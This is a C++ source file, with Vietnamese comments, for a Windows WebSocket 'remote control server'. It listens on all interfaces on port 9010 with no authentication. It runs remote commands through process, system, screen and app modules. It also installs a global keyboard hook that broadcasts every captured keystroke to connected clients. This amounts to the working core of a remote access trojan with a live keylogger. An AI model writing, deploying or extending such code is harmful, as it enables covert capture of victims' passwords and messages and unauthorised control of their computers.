// main.cpp – WebSocket Server tích hợp CommandDispatcher mới
// Build: Boost.Beast, nlohmann/json, User Modules

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>

#include <iostream>
#include <string>
#include <thread>
#include <mutex>
#include <vector>
#include <algorithm>

#include <nlohmann/json.hpp>

// --- INCLUDE DISPATCHER VÀ INTERFACE ---
#include "core/CommandDispatcher.hpp"
#include "interfaces/IRemoteModule.hpp"

// --- INCLUDE MODULE KEYMANAGER (Vẫn cần biến toàn cục cho Hook) ---
#include "modules/KeyManager.hpp" 

namespace beast     = boost::beast;
namespace websocket = beast::websocket;
namespace net       = boost::asio;
using tcp           = net::ip::tcp;
using json          = nlohmann::json;

// ============================================================
// 1. GLOBALS & HELPERS
// ============================================================

static std::mutex cout_mtx;
KeyManager keyManager; // Biến toàn cục để quản lý Hook

// --- ADAPTER CHO KEYMANAGER ---
// Vì KeyManager cần là biến toàn cục (để Hook chạy ổn định), 
// nhưng Dispatcher lại cần unique_ptr<IRemoteModule>.
// Ta tạo class này để làm cầu nối.
class KeyManagerAdapter : public IRemoteModule {
public:
    const std::string& get_module_name() const override { 
        static const std::string name = "KEYBOARD";
        return name;
    }
    
    json handle_command(const json& request) override {
        // Chuyển tiếp lệnh vào biến toàn cục keyManager
        return keyManager.handle_command(request);
    }
};

// Khởi tạo Dispatcher (Nó sẽ tự new Process, System, App, Screen trong Constructor)
CommandDispatcher g_dispatcher; 

// ============================================================
// 2. SESSION MANAGER (Broadcast Keylog)
// ============================================================
class SessionManager {
public:
    void join(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.push_back(ws);
    }

    void leave(websocket::stream<tcp::socket>* ws) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(std::remove(sessions_.begin(), sessions_.end(), ws), sessions_.end());
    }

    void broadcast(const std::string& message) {
        std::lock_guard<std::mutex> lock(mutex_);
        for (auto* ws : sessions_) {
            try {
                ws->text(true);
                ws->write(net::buffer(message));
            } catch (...) {} // Bỏ qua lỗi nếu client disconnect đột ngột
        }
    }

private:
    std::vector<websocket::stream<tcp::socket>*> sessions_;
    std::mutex mutex_;
};

static SessionManager g_sessionManager;

// ============================================================
// 3. SESSION LOOP
// ============================================================
void do_session(tcp::socket s) {
    websocket::stream<tcp::socket> ws{std::move(s)};
    
    try {
        // Info Client
        std::string client_ip = ws.next_layer().remote_endpoint().address().to_string();
        {
            std::lock_guard<std::mutex> lk(cout_mtx);
            std::cout << "[SESSION] NEW CONNECTION: " << client_ip << "\n";
        }

        ws.accept();
        g_sessionManager.join(&ws);

        for (;;) {
            beast::flat_buffer buffer;
            ws.read(buffer); // Block chờ lệnh
            
            std::string req_str = beast::buffers_to_string(buffer.data());
            
            // Parse & Dispatch
            json request, response;
            try {
                request = json::parse(req_str);

                // Log
                {
                    std::lock_guard<std::mutex> lk(cout_mtx);
                    std::string mod = request.value("module", "?");
                    std::string cmd = request.value("command", "?");
                    std::cout << "[RECV] " << mod << " -> " << cmd << "\n";
                }

                // GỌI DISPATCHER TẠI ĐÂY
                response = g_dispatcher.dispatch(request);

            } catch (const std::exception& e) {
                response = {{"status", "error"}, {"message", e.what()}};
            }

            ws.text(true);
            ws.write(net::buffer(response.dump()));
        }

    } catch (const beast::system_error& se) {
        if (se.code() != websocket::error::closed) {
            std::cerr << "[ERROR] Beast: " << se.code().message() << "\n";
        }
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Session: " << e.what() << "\n";
    }

    g_sessionManager.leave(&ws);
}

// ============================================================
// 4. MAIN
// ============================================================
int main() {
    SetConsoleOutputCP(CP_UTF8);
    std::cout << std::unitbuf;

    std::cout << "=== REMOTE CONTROL SERVER (OOP Dispatcher) ===\n";

    // --- A. ĐĂNG KÝ MODULE ---
    // Các module Process, System, Screen, App ĐÃ ĐƯỢC đăng ký trong Constructor của CommandDispatcher.
    
    // Riêng KEYBOARD cần đăng ký thủ công qua Adapter để kết nối với biến toàn cục
    g_dispatcher.register_module(std::make_unique<KeyManagerAdapter>());


    // --- B. SETUP KEYLOGGER CALLBACK ---
    // Khi KeyManager bắt phím -> Gọi Broadcast
    KeyManager::set_callback([&](std::string key_char) {
        json msg;
        msg["module"] = "KEYBOARD";
        msg["command"] = "PRESS";
        msg["data"] = { {"key", key_char} };
        
        // Debug log
        std::cout << "[KEY] " << key_char << "\n";
        
        // Gửi cho tất cả Client
        g_sessionManager.broadcast(msg.dump());
    });


    // --- C. KHỞI TẠO SERVER ---
    try {
        const unsigned short port = 9010;
        auto address = net::ip::make_address("0.0.0.0");
        net::io_context ioc{1};
        tcp::acceptor acceptor{ioc, {address, port}};

        std::cout << "[SERVER] Listening on port " << port << "...\n";

        for (;;) {
            tcp::socket socket{ioc};
            acceptor.accept(socket);
            std::thread(do_session, std::move(socket)).detach();
        }

    } catch (const std::exception& e) {
        std::cerr << "[FATAL] " << e.what() << "\n";
        return 1;
    }

    return 0;
}